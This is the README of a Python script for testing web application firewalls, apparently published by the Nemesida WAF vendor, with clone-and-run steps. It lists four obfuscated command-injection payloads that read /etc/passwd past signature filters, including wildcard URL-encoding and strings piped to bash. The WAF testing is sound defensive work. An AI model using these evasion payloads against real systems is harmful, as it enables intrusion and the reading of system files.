# WAF Bypass script

WAF bypass is a simple script written in Python3 for testing Web Application Firewall. Before use, it is recommended to temporarily add the IP address from which testing is carried out to the whitelist.

## Do not break the law when using!

A script developed for internal needs, including for testing Nemesis WAF and Nemesida WAF Free, but you can use it to test any WAF.

![WAF Bypass Script](https://img.defcon.ru/store/2020/06/b2c49eec8dce3f156d90bcd35a9f2739.png)

There are attacks for which it is impossible to create a signature, while not increasing the number of false positives. Therefore, it is absolutely normal that Nemesida WAF Free skips the attack, and the commercial version of Nemesida WAF Free blocks. For example, we can execute the <code>cat /etc/passwd</code> command in the following ways:
<pre>
%2f???%2f??t%20%2f???%2fp??s??
cat+/e't'c/pa'ss'wd
e'c'ho 'swd test pentest' |awk '{print "cat /etc/pas"$1}' | bash
ec'h'o 'cat /etc/examplewd' | sed 's/example/pass/g' | bash
</pre>

## How to run

<pre>
# mkdir /opt/waf-bypass/
# git clone https://github.com/nemesida-waf/waf_bypass.git /opt/waf-bypass/
# python3 -m pip install -r /opt/waf-bypass/requirements.txt
# cd /opt/waf-bypass/

# python3 /opt/waf-bypass/main.py
</pre>
